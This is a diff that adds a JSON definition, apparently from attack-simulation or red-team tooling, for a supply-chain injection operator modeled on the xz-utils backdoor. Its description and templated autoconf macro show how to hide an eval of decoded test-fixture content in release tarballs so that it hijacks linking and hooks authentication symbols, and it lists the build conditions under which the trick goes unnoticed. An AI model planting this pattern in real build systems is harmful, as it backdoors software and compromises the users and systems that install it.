@@ -1,0 +1,12 @@
+{
+  "id": "operator_xz_utils_macro_injection",
+  "description": "Injects an obfuscated M4 macro and supplementary binary test fixture into the autotools configuration during release tarball creation to hijack linker behavior and hook sensitive authentication symbols.",
+  "target_build_phase": "Dependency Fetch",
+  "injection_location": "m4/{{MACRO_FILE}}.m4",
+  "code_template": "AC_DEFUN([{{MACRO_NAME}}], [\n  if test -f \"{{TEST_FIXTURE_PATH}}\"; then\n    eval $(tr '\\n' ' ' < \"{{TEST_FIXTURE_PATH}}\" | sed 's/{{DECODE_FILTER}}//g')\n  fi\n])",
+  "preconditions": [
+    "Build system utilizes GNU Autotools (autoconf/automake).",
+    "Release generation step packages distributed tarballs outside of version control tracking.",
+    "Target binary links against the modified shared library during compilation."
+  ]
+}
